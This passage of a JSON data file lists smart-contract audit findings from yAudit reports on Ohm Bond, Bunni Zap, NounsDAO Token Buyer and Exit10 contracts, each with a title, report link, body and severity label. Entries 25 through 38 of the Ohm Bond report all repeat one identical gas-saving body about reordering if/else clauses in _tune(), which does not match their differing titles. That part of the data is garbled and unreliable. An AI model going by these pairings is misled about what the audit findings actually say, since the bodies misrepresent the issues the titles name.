        "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "25. Unclear if default tuning parameters are optimal",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "26. Add a check to limit debtBuffer to 100%",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "27. Function format inconsistency",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "28. Variable name nitpick",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "29. TransferHelper.sol not from solmate",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "30. CloneERC20.sol missing EIP-2612 code",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "31. Incorrect comment",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "32. Confusing variable naming",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "33. Expired markets are never \"closed\"",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "34. Legitimate tokens disallowed",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "35. Tokens with non-string metadata disallowed",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "36. vesting and expiry sometimes used interchangeably",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "37. market price functions consistency",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "38. Use variable instead of magic numbers",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. Add token revocation to functions granting approval",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Bunni-Zap.md",
        "body": "Currently only enterWithUnderlying() and enterWithVaultShares() revoke token approval after the function has finished executing.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. nonReentrant isn't needed",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Bunni-Zap.md",
        "body": "nonReentrant is usually needed when a function is manipulating state variables that are used in other functions. In this case, the functions listed below are not manipulating state variables that are used in other functions, so the nonReentrant modifier is not needed. List of functions: zapIn in BunniLpZapIn.sol line 79 zapInNoStake in BunniLpZapIn.sol line 155 enterWithUnderlying in BunniLpZapIn.sol line 221 enterWithVaultShares in BunniLpZapIn.sol line 255 doZeroExSwap in BunniLpZapIn.sol line 309",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. Payable functions don't receive ETH",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Bunni-Zap.md",
        "body": "The following functions are marked as payable but are not used as such: doZeroExSwap in BunniLpZapIn.sol line 309 selfPermit in SelfPermit.sol line 36 selfPermitIfNecessary in SelfPermit.sol line 40 selfPermitAllowed in SelfPermit.sol line 47 selfPermitAllowedIfNecessary in SelfPermit.sol line 54",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. Add events to functions",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Bunni-Zap.md",
        "body": "While the underlying dependencies in each function of the BunniLpZapIn contract emit events, the functions themselves do not emit events.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. Price range should be within Chainlink's range",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md",
        "body": "PriceFeed.sol#L93",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. ETH buyer pays the gas cost of debt payments",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md",
        "body": "TokenBuyer.sol#L195, TokenBuyer.sol#L235",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. Can require the basis point values to be less than 10_000",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md",
        "body": "TokenBuyer.sol#L146-L148",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. Use a two-step Ownership transfer pattern",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md",
        "body": "TokenBuyer.sol, Payer.sol",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. Existing debts should be prioritized in sendOrRegisterDebt()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md",
        "body": "Payer.sol#L100",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. Risk of USDC depeg",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md",
        "body": "DeployTokenBuyer.s.sol",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Fee-on-transfer token not supported",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md",
        "body": "TokenBuyer.sol",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Replace owner() with msg.sender in withdrawPaymentToken()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md",
        "body": "Payer.sol#L123",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. Cache totalDebt in payBackDebt()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md",
        "body": "Payer.sol#L158, Payer.sol#L173",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. Use _debtAmount instead of debt.amount",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md",
        "body": "Payer.sol#L146-L152",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. DebtQueue.empty() can just check for equality",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md",
        "body": "DebtQueue.sol#L112",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. Precompute decimal factor to save gas and avoid magic numbers",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md",
        "body": "TokenBuyer.sol#L292, TokenBuyer.sol#L323",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. TokenBuyer may not use the entire received amount to pay the debt",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md",
        "body": "TokenBuyer.sol#L235-L237",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. TokenBuyer's constructor can fetch paymentToken from payer",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md",
        "body": "TokenBuyer.sol#L153",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. DebtDeque's _begin and _end can be uint128",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md",
        "body": "DebtQueue.sol#L30-L44",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "16. Review tokens before supporting them via TokenBuyer",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md",
        "body": "Repo",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "17. onlyAdmin() is not used",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md",
        "body": "TokenBuyer.sol#L120-L125",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "18. Consider solidity 0.8.16 or higher",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md",
        "body": "Example: TokenBuyer.sol#L16",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "19. Consider adding events for creating and paying back the debt if the debt is paid back on creation",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md",
        "body": "Payer.sol#L100",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. _getPercentFromTarget() called with incorrect argument",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "_getPercentFromTarget() calculates a return value that represents a percent value. The calculation can be summarized as (x / bootstrapTargetLiquidity) * 100%. This ratio and the context of this line of coe indicates that x should be the current bootstrap liquidity held by the protocol. The current code does not use the current bootstrap liquidity value and therefore needs modification.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. Incorrect value in _safeTokenClaim()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "The ratio of rewards that a user can claim to the total rewards supply should be the same as the ratio of tokens that the user holds to the total token supply. This is how the _safeTokenClaim() logic works in the first step. The second step involves a correction to the rewards that a user can claim if the total claimed rewards exceed the total supply of rewards. This is how the logic should work, but this line of code actually checks if the total claimed rewards exceed the total supply of EXIT, BOOT, or other tokens. The total supply of tokens should not be involved in this calculation, the total supply of rewards should be used.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. bootstrapBucket fees are double counted in claimAndDistributeFees()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "To summarize the fee collection logic that is currently implemented in claimAndDistributeFees(), assume: amountCollected0 = 100 bootstrapFees0 = 10 (this implies bootstrap liquidity is 10% of the total Exit10 liquidity) amountCollected0 passed to FeeSplitter.collectFees() = 90 (100 - 10 = 90) The amount of fees passed to FeeSplitter.collectFees() is 90 (this is the amountCollected0 value from the previous calculation). This value is then distributed by the ratio of pending bucket's liquidity over the total liquidity (the sum of liquidity of all buckets), which is 70%. If pendingBucket is 70% of liquidity while remainingBuckets are 30% of liquidity, then assuming the original 100 of fees, pendingBucket should get 70% of fees, in this example, 70 worth of fees. But because only 90 worth of fees is passed in collectFees(), pendingBucket instead gets 70% of 90, 63. The result is that pendingBucket is penalized while the bootstrap bucket gets counted twice and effectively gets double fees.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. Reinvested bootstrap fees are counted as fee-earning liquidity immediately",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "Exit10.claimAndDistributeFees() collects and distributes the Uniswap LP fees between the different buckets in the Exit10 protocol. This distribution of rewards is calculated using the liquidity share owned by each bucket. The more liquidity that a bucket owns, the more fees that the bucket deserves. But the total Uniswap v3 LP liquidity is increased in this function and the newly added liquidity did not contribute to generating the fees that were just collected. Therefore the value of Exit10._exitBucket() is greater than the Exit bucket liquidity that is responsible for generating the collected fees. This means that the Exit bucket will receive a larger share of fees than it should and other buckets will be penalized.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. _depositAndSwap() should set non-zero amountOutMinimum values",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "Uniswap v3 docs have this to say about amountOutMinimum: amountOutMinimum: we are setting to zero, but this is a significant risk in production. For a real deployment, this value should be calculated using our SDK or an onchain price oracle - this helps protect against getting an unusually bad price for a trade due to a front running sandwich or another type of price manipulation Exit10 sets a amountOutMinimum value of zero in several places, including in _depositAndSwap() and claimAndDistributeFees(). There is a risk of value loss due to MEV bots when the minimum value is set to zero.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. Unconsumed allowance will break fee updates",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "When the FeeSplitter is updating the rewards for the masterchef contracts, it first swaps USDC for WETH. This in turn calls swap() in Swapper.sol. This function uses safeApprove to give the Uniswap V3 Router permission to spend all of the USDC the FeeSplitter has given the Swapper. Importantly, the Swapper also creates a price limit and adds this as parameter in its call to the Uniswap V3 Router. The problem in this case combines two related truths: safeApprove requires that the previous allowance be completely spent or that it is called with a 0 value. Under any other circumstance it will revert. There is a non-zero chance that the call to the Uniswap V3 Router will not consume the entire allowance set by the call to safeApprove. Uniswap V3 Router's exactInputSingle function, which is what was called by the Swapper, calls exactInputInternal which itself calls swap directly on the pool with the provided parameters. As mentioned earlier, a price limit was included among these parameters. The swap function in Uniswap V3 then swaps in steps until it either has used the entire amountIn or it hits the price limit specified. If it hits the price limit specified before it hits the amountIn, there will be an unconsumed allowance and all subsequent calls to the Swapper's swap function will fail.",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Exit10.sol ignores token order when sending fees to FeeSplitter.sol",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
        "body": "The call to collect() in the Uniswap pool will return collected fees as amount0 and amount1 which corresponds to the token0 and token1 of the pool. These amounts are eventually forwarded to the call to collectFees() in the FeeSplitter.sol contract. The third and fourth arguments are amountTokenOut and amountTokenIn, amountTokenOut should correspond to the \"token out\" (USDC) while amountTokenIn should correspond to the \"token in\" (ETH). The order here is important because FeeSplitter.sol use amountTokenOut as transfer amount for USDC. However, claimAndDistributeFees() ignores this order and simply sends amountCollected0 as amountTokenOut and amountCollected1 as amountTokenIn. This will work on Ethereum mainnet as the address of USDC is lower than the address of WETH, meaning token0 is \"token out\", but will fail on Optimism where the address of USDC is greater than the address of WETH. The following test simulates an scenario where token0 is WETH and token1 is USDC by forking Optimism. The call to claimAndDistributeFees() will revert as FeeSplitter.sol will try to pull more funds than available from the Exit10.sol contract. Full test suite is available here. function test_Exit10_claimAndDistributeFees_IncorrectTokenOrder() public { // We are on optimism where the token0/1 order in inverse to mainnet setUpOptimism(); // Skip bootstrap phase _skipBootstrap(); // Create a bond to provide some liquidity weth.approve(address(exit10), type(uint256).max); usdc.approve(address(exit10), type(uint256).max); deal(address(weth), address(this), 10 ether); deal(address(usdc), address(this), 10_000e6); _createBond(10 ether, 10_000e6); // Do some swaps to generate fees weth.approve(UNISWAP_V3_ROUTER, type(uint256).max); usdc.approve(UNISWAP_V3_ROUTER, type(uint256).max); _generateFees(usdc, weth, 1e12); // This function will claim fees from the pool and call collectFees() in FeeSplitter. // FeeSplitter will try to pull the tokens from Exit10 but will fail since the token order is wrong, // the call to collectFees() sends the USDC amount as the WETH amount and the WETH amount as the // USDC amount. As these amounts represent different magnitudes, the transaction will be reverted // since the Exit10 contract won't have those balances. For example, if fees are 500 USDC it will // try to pull 500 WETH from the Exit10 contract. vm.expectRevert(\"ERC20: transfer amount exceeds balance\"); exit10.claimAndDistributeFees(); }",
        "labels": [
            "yAudit",
            "Severity: High",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Potential loss of collected fees during the call to claimAndDistributeFees()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md",
